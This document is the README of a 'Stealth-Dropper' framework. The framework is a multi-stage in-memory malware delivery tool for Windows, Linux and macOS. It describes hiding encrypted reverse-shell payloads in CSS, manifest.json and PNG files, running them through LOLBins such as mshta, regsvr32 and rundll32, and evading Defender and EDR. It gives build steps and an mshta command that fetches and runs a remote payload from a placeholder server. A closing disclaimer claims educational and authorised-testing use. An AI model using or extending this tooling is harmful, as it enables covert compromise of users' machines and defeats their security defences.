# 🕵️‍♂️ Stealth-Dropper Framework

> Multi-stage, multi-platform in-memory payload delivery system — built for **stealth**, **flexibility**, and **modern bypass**.

---

## 🎯 Features

- 🔒 **Full In-Memory Execution**: No payloads are written to disk.
- 🧠 **Multi-Stage Architecture**:
  - Stage 1: lightweight dropper, decrypts & executes Stage 2
  - Stage 2: encrypted payload (XOR + Base64), delivered via CSS/JSON/etc.
- 🎭 **Payload Hiding**:
  - Encrypted payloads embedded in:
    - `style.css` (as `content`)
    - `manifest.json`
    - `favicon.png` (optional stego)
- 🧬 **Built-in Obfuscation**:
  - Encrypted XOR+Base64 payload
  - LOLBins for execution (`mshta`, `regsvr32`, `rundll32`)
- 🧾 **JavaScript Dropper (`decrypt.html`)**:
  - Executes without `Invoke-Expression (IEX)`
  - Designed for `mshta.exe` execution
- 🦠 **Sandbox & AV Evasion**:
  - Optional anti-VM/anti-sandbox checks (WIP)
  - Designed for 2025-era Windows Defender + EDR bypass
- 💻 **Multi-Platform Support**:
  - Windows (PowerShell, LOLBins)
  - Linux (bash payloads)
  - macOS (osascript)

---

## 📁 Project Structure

```
stealth-dropper/
├── build_and_run.sh          # Payload builder and runner
├── config/                   # Configuration and runtime parameters
├── payloads/                 # Organized by OS and payload type
│   ├── windows/
│   │   ├── shell_reverse/
│   │   └── lolbins/
│   ├── linux/
│   └── mac/
├── tools/                    # Encryptors, embedders, stego tools
├── web/                      # Web delivery files (CSS, HTML, etc.)
└── README.md
```

---

## 🚀 Quick Start

```bash
chmod +x build_and_run.sh
./build_and_run.sh
```

The script will prompt you to select:
1. Target OS (windows, linux, mac)
2. Payload type (e.g. reverse shell)
3. It will:
   - Encrypt the raw payload
   - Embed it in CSS or JSON
   - Output the final files into `web/` for serving

---

## 🛠 Tools Included

- `encryptor.py`: XOR + Base64 encryption
- `embed_in_css.py`: Injects payload into CSS `::after`
- `embed_in_manifest.py`: JSON embedding (browser extension style)
- `embed_in_png.py`: Stego placeholder (optional)

---

## 🧪 Execution Flow (Windows example)

1. Host `web/decrypt.html` + `style.css`
2. User executes:
   ```bash
   mshta http://yourserver/decrypt.html
   ```
3. JavaScript reads encrypted payload from CSS
4. Decodes → Decrypts → Executes in memory via `ScriptBlock::Create()`
5. No artifacts left on disk

---

## ⚠️ Disclaimer

This framework is for **educational** and **authorized penetration testing** purposes **only**.

Use responsibly.
